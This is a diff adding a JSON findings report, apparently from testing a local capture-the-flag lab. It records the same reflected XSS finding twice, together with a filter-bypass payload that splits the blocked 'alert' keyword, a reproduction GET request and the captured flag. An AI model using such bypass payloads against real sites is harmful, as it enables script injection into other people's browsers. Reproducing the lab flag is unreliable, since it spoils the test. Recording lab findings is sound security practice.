@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-15T01:06:00.359078+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "05995523-0d5b-4dbf-b61a-40aff3513977",
+      "timestamp": "2026-04-15T01:06:00.358823+00:00",
+      "title": "Reflected XSS with alert('XSS') bypass",
+      "severity": "high",
+      "target": "http://172.17.0.1:33677/page",
+      "description": "The 'name' parameter on /page is vulnerable to reflected XSS. The application filters 'alert' keyword, but it can be bypassed using string concatenation: window['al'+'ert']('XSS'). Successfully executed XSS with alert('XSS') and retrieved the flag.",
+      "evidence": "flag{2fba7376-856b-4b60-8eeb-c54c23186622}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<svg/onload=window['al'+'ert']('XSS')>",
+        "expected": "XSS alert popup with 'XSS' text, revealing the flag"
+      }
+    },
+    {
+      "id": "e7d07aa1-d44a-4a29-bd9b-d9d7abbf0692",
+      "timestamp": "2026-04-15T01:06:00.369651+00:00",
+      "title": "Reflected XSS with alert('XSS') bypass",
+      "severity": "high",
+      "target": "http://172.17.0.1:33677/page",
+      "description": "The 'name' parameter on /page is vulnerable to reflected XSS. The application filters 'alert' keyword, but it can be bypassed using string concatenation: window['al'+'ert']('XSS'). Successfully executed XSS with alert('XSS') and retrieved the flag.",
+      "evidence": "flag{2fba7376-856b-4b60-8eeb-c54c23186622}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<svg/onload=window['al'+'ert']('XSS')>",
+        "expected": "XSS alert popup with 'XSS' text, revealing the flag"
+      }
+    }
+  ],
+  "diagrams": []
+}
